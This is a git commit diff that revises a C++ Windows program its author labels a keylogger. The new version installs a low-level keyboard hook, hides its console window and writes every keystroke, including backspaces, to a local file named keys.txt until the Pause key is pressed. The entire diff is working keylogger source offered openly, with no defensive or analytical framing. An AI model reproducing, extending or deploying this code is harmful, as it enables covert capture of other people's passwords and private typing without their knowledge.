fa11b8cd9cf5c7c5151d1a62bc90726f6963b4d7
Luke Honeyball <165500927+LukeHoneyball@users.noreply.github.com>
2024-05-10 10:18:42 +0200

    Update main.cpp
    had to revise it..

--- main.cpp
+++ main.cpp
@@ -1,30 +1,60 @@
+/*
+	Code by Luke Honeyball
+	5/10/2024
+	Keylogger
+
+*/
+
 #include <iostream>
 #include <windows.h>
 #include <fstream>
+//imports
+HHOOK hook;
+bool running = true;
+std::string path = "keys.txt";
+std::ofstream File(path);
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+	if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+		KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
+		if (pKeyStruct->vkCode == VK_BACK)
+		{
+			File << " |BACKSPACE| ";
+			Sleep(100);
+		}else if (pKeyStruct->vkCode == VK_PAUSE) {
 
-int main() {
-	
-	std::string path = "keys.txt";
-	std::ofstream File(path);
-	FreeConsole();
-	while (!GetKeyState(VK_PAUSE)) {
-		
-		for (int x = 0; x < 120; x++) {
-			if (GetKeyState(x) & 0x8000) {
-				if (x == 8) {
-					File << "|BACKSPACE|";
+			File.close();
+
+			UnhookWindowsHookEx(hook);
+			exit(0);
+		}
+		else {
+			for (int x = 0; x < 128; x++) {
+				std::cout << pKeyStruct->vkCode;
+
+				if (pKeyStruct->vkCode == x) {
+					File << (char)pKeyStruct->vkCode;
+					Sleep(100);
 				}
-				else {
-					File << (char)x;
-				}
-				
-				Sleep(100);
+
 			}
 		}
-		
-	
 	}
-	File.close();
+	return CallNextHookEx(hook, nCode, wParam, lParam);
+}
+//hook process
+
+int main() {
+	FreeConsole();//make console invisible
+	hook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyboardProc,NULL,0);
+	MSG m;
+	while (running == true) {
+
+		GetMessage(&m,NULL,0,0);
+		TranslateMessage(&m);
+		DispatchMessage(&m); 
+		//loop
+	}
 	
 	return 0;
 }
+//revised
